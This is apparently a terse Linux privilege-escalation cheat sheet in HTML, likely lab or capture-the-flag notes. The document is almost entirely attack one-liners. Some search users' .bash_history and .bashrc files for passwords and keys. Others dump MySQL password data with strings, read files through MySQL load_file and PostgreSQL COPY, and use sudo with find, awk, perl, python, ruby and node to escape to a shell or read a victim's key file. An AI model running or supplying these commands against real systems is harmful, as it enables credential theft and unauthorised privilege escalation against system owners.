EX: XXXX | <b>XXXX</b> (XXXX) </br>

00 - Searching all the files named .bash_history in the /home directory | <b>find /home -name .bash_history</b> (.bash_history cmds used) </br></br>
01 - Searching PATERN "key" in all files (-H show the file/s matched) | <b>find /home -name .bashrc -exec grep -H key {} \\;</b> (.bashrc set alias by user) </br></br>
02 - Searching PATERN "export" without GCC_COLORS in all files (-H show the file/s matched) | <b>find /home -name .bashrc -exec grep -H export {} \\;
 grep -v GCC_COLORS</b> (.bashrc set alias by user) </br></br>
03 - Searching PATERN "passwd" in all .bash_history (-A print NUM lines of trailing context) | <b>find /home -name .bash_history -exec grep -A 1 '^passwd' {} \\;</b></br></br>
04 - Unencrypting file with openssl | <b> openssl aes-256-cbc -d -in backup.tgz.enc -out decode.tar.gz</b> (tar -zxvf decode.tar.gz) </br></br>
05 - Mysql root password | <b>strings /var/lib/mysql/mysql/user.MYD</b> (2 passwords) </br></br>
06 - Mysql load files | <b>select load_file('/var/lib/mysql-files/key.txt');</b></br></br>
07 - Postgres load files:</br>
 CREATE TABLE demo(t text);</br>
 COPY demo from '[FILENAME]';</br>
 SELECT * FROM demo;</br></br>
 08 - SUDO find: sudo -u victim /usr/bin/find . -exec cat /home/victim/key.txt {} \;</br></br>
 09 - SUDO awk: sudo -u victim /usr/bin/awk 'BEGIN {system("/bin/bash")}';</br></br>
 10 - SUDO perl: sudo -u victim /usr/bin/perl -e 'exec "/bin/sh";'</br></br>
 11 - SUDO python: sudo -u victim /usr/bin/python -c 'import os; os.system("/bin/sh")'</br></br>
 12 - SUDO ruby: sudo -u victim /usr/bin/ruby -e 'exec "/bin/sh"'</br></br>
 13 - SUDO node: sudo -u victim /usr/local/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'</br></br>
 

